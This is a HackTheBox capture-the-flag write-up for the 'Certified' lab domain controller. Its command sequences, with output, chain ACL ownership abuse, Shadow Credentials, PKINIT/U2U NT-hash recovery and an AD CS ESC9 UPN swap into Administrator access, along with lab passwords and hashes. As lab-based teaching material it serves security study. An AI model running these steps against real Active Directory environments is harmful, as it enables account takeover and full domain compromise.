
# HackTheBox — Certified

| Field          | Detail                      |
|----------------|-----------------------------|
| **OS**         | Windows Server 2019         |
| **Difficulty** | Medium                      |
| **Domain**     | certified.htb               |
| **IP**         | 10.129.231.186              |

---

## Initial Access

Credentials are provided upfront (assumed-breach scenario):

```
Username: judith.mader
Password: judith09
```

---

## Reconnaissance

### Port Scan

```bash
nmap -sCV -vv -p- --disable-arp-ping -Pn 10.129.231.186 -oN fullport.nmap
```

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-08-30 18:33:07Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
49721/tcp open  msrpc         syn-ack Microsoft Windows RPC
49742/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

The presence of **Kerberos (88)**, **DNS (53)**, **LDAP (389/636/3268/3269)** and **SMB (445)** confirms a **Domain Controller**. The LDAP service certificates also expose the CA common name `certified-DC01-CA`, an early hint that **Active Directory Certificate Services (AD CS)** is present in this environment.

Add entries to `/etc/hosts`:

```bash
sudo nxc smb 10.129.231.186 --generate-hosts-file /etc/hosts
# 10.129.231.186   DC01.certified.htb certified.htb DC01
```

---

## LDAP Enumeration

### Validating the Given Credentials

```bash
nxc ldap DC01 -u users.txt -p passw.txt
```

```
LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never)
LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09
```

---

## BloodHound Enumeration

```bash
bloodhound-python -ns 10.129.231.186 -d certified.htb -u judith.mader -p judith09 -c all --zip
```

Analyzing the collected data reveals a chained ACL abuse path:

```
judith.mader ──[WriteOwner]──► MANAGEMENT (group)
MANAGEMENT   ──[GenericWrite]──► MANAGEMENT_SVC (user)
MANAGEMENT_SVC ──[GenericAll]──► CA_OPERATOR (user)
```

---

## Abusing Ownership of the MANAGEMENT Group

Take ownership of the group object with Impacket's `owneredit`:

```bash
owneredit.py -action 'write' -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```

```
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Grant `FullControl` over the group now that ownership was seized:

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
```

Add ourselves as a member of the group:

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add groupMember MANAGEMENT judith.mader
```

```
[+] judith.mader added to MANAGEMENT
```

---

## Abusing GenericWrite over MANAGEMENT_SVC — Shadow Credentials

Sync the clock (required for Kerberos):

```bash
sudo ntpdate -s certified.htb
```

With `GenericWrite` inherited through group membership, perform a **Shadow Credentials attack** against `management_svc`:

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" -v
```

```
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] KeyCredential generated with DeviceID: 2643c2b3-712a-73e0-e914-192dcecb4091
[+] Updated the msDS-KeyCredentialLink attribute of management_svc
[+] Saved PFX (#PKCS12) certificate & key at path: HgV7JfgN.pfx
[*] Must be used with password: ozLeqaJhUzAzdbeMVu4v
```

### Requesting a TGT with the Forged Certificate

```bash
python3 gettgtpkinit.py -cert-pfx HgV7JfgN.pfx certified.htb/management_svc -pfx-pass 'ozLeqaJhUzAzdbeMVu4v' management_svc.ccache
```

```
minikerberos INFO     Requesting TGT
minikerberos INFO     AS-REP encryption key (you might need this later):
minikerberos INFO     0879f17bb2ae98c46e28beae8f161864d45b8392131d65b4e32ebd58c711887e
minikerberos INFO     Saved TGT to file
```

### Recovering the NT Hash via U2U

```bash
export KRB5CCNAME=management_svc.ccache
python3 getnthash.py -key 0879f17bb2ae98c46e28beae8f161864d45b8392131d65b4e32ebd58c711887e certified.htb/management_svc
```

```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

**Credentials:** `management_svc : a091c1832bcdd4677c28b5a6a1295584 (NT)`

---

## WinRM Access — management_svc

```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

```
*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
certified\management_svc
```

### User Flag

```
*Evil-WinRM* PS C:\Users\management_svc\Documents> dir ../Desktop

    Directory: C:\Users\management_svc\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/30/2026  11:29 AM             34 user.txt
```

---

## Privilege Escalation — AD CS ESC9

### Shadow Credentials — CA_OPERATOR

`management_svc` has `GenericAll` over `ca_operator`, so the same technique is repeated:

```bash
python3 pywhisker.py -d "certified.htb" -u "management_svc" -H ":a091c1832bcdd4677c28b5a6a1295584" --target "ca_operator" --action "add" -v
```

```
[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
[*] KeyCredential generated with DeviceID: 59510449-9d85-39be-f5db-15aeb19cb930
[+] Updated the msDS-KeyCredentialLink attribute of ca_operator
[+] Saved PFX (#PKCS12) certificate & key at path: PRIKQ5t3.pfx
[*] Must be used with password: 2Ole4YpdHl9BFWu5R9bY
```

```bash
python3 gettgtpkinit.py -cert-pfx PRIKQ5t3.pfx certified.htb/ca_operator -pfx-pass '2Ole4YpdHl9BFWu5R9bY' ca_operator.ccache
```

```bash
export KRB5CCNAME=ca_operator.ccache && python3 getnthash.py -key 9c5ff40dffd6498a98c3cd2d64d8868ec337100b3faf31955818d9921e714e2c certified.htb/ca_operator
```

```
Recovered NT Hash
b4b86f45c6018f1b664f70805f45d8f2
```

**Credentials:** `ca_operator : b4b86f45c6018f1b664f70805f45d8f2 (NT)`

### Finding a Vulnerable Certificate Template

```bash
certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
```

```
Template Name                       : CertifiedAuthentication
Certificate Name Flag               : SubjectAltRequireUpn
                                       SubjectRequireDirectoryPath
Enrollment Flag                     : PublishToDs
                                       AutoEnrollment
                                       NoSecurityExtension
[+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
[!] Vulnerabilities
  ESC9                              : Template has no security extension.
```

`ca_operator` can enroll in a template affected by **ESC9** (`NoSecurityExtension`), meaning the issued certificate won't embed the requester's SID — so the account's UPN can be swapped to `Administrator` before enrollment, per [The Hacker Recipes — ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension).

### Abusing ESC9 — UPN Swap

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

```
[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Request a certificate as `ca_operator`, now carrying the `Administrator` UPN:

```bash
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

### Authenticating as Administrator

```bash
certipy-ad auth -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.129.231.186
```

```
[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Got TGT
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

**Credentials:** `Administrator : 0d5b49608bbce1751f708748f67e2d34 (NT)`

---

## Root Flag

```bash
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop/

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/30/2026  11:29 AM             34 root.txt
```

---

## Attack Chain

```
judith.mader (given creds)
        │
   BloodHound enumeration
        │
  [WriteOwner] ──► MANAGEMENT group
        │
  owneredit + dacledit ──► FullControl
        │
  join MANAGEMENT group
        │
  [GenericWrite] ──► management_svc
        │
  Shadow Credentials (pywhisker)
        │
  PKINIT TGT ──► NT hash (U2U)
        │
  WinRM ──► user.txt ✓
        │
  [GenericAll] ──► ca_operator
        │
  Shadow Credentials (pywhisker)
        │
  PKINIT TGT ──► NT hash (U2U)
        │
  certipy-ad find ──► ESC9 (NoSecurityExtension)
        │
  UPN swap: ca_operator ──► Administrator
        │
  certipy-ad req ──► administrator.pfx
        │
  certipy-ad auth ──► Administrator NT hash
        │
  WinRM ──► root.txt ✓
```

---

## Tools Used

| Tool                    | Purpose                                        |
|-------------------------|-------------------------------------------------|
| nmap                    | Port scanning                                  |
| netexec (nxc)           | SMB/LDAP credential validation                 |
| bloodhound-python       | BloodHound data collection                     |
| BloodHound              | AD ACL / attack path analysis                  |
| owneredit.py (Impacket) | Object ownership abuse                         |
| dacledit.py (Impacket)  | ACE / DACL abuse (grant FullControl)           |
| bloodyAD                | Group membership modification                  |
| pywhisker               | Shadow Credentials attack (msDS-KeyCredentialLink) |
| gettgtpkinit.py (PKINITtools) | PKINIT TGT request from a certificate     |
| getnthash.py (PKINITtools)    | NT hash recovery via U2U                  |
| certipy-ad              | AD CS enumeration, ESC9 abuse, certificate auth |
| evil-winrm              | Remote shell via WinRM                         |

---

## Key Takeaways

- **ACL abuse chains compound quickly** — `WriteOwner` → `FullControl` → group membership → `GenericWrite`/`GenericAll` turned one low-privilege account into a path to `Administrator` without a single exploit.
- **Shadow Credentials attacks** are a reliable way to take over an account once `GenericWrite`/`GenericAll` is obtained, without ever needing to know or reset its password.
- **PKINIT + U2U** lets an attacker turn a certificate into a usable NT hash, bridging certificate-based auth back into classic NTLM/Kerberos tooling.
- **ESC9 (`NoSecurityExtension`)** is easy to miss in an AD CS review — without the security extension, a certificate's issued identity can be steered by simply changing the requester's UPN beforehand.
- **`certipy-ad find -vulnerable`** should be a standard step whenever AD CS is in scope; misconfigured templates are consistently one of the fastest paths to Domain Admin.

---
